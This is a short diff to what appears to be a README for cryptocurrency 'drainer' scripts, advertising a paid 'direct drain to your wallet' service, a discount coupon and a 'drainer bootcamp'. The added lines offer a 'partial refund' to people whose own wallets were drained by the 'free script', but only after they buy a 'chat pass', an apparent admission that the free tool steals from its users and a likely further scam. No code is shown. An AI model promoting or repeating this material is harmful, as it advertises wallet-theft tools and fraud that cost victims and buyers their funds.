@@ -5,6 +5,9 @@
 
 !!!!!!!For direct drain to your wallet with no custom smart contract https://moneywithbots.sellix.io/ !!!!!!!!!!!!!
 
+### IF YOU WERE DRAINED BY THIS FREE SCRIPT BY AN ERROR MADE BY YOU I WILL OFFER A PARIAL REFUND ONLY TO BE SENT TO THE ADDRESS DRAINED FROM MUST PURCHASE CHAT PASS TO CONTACT ME THE CHAT PASS AND PARTIAL REFUND WILL BE FOWARDED TO YOU IF YOUR ADDRESS WAS DRAINED BY THIS FREE VERSION ###
+
+
 !!!!!!!!! 20 % off for first 100 users and get the drainer bootcamp free with all the info needed too use the scripts 
 coupon code : "OYESHIBgvxdPlpbD"          !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
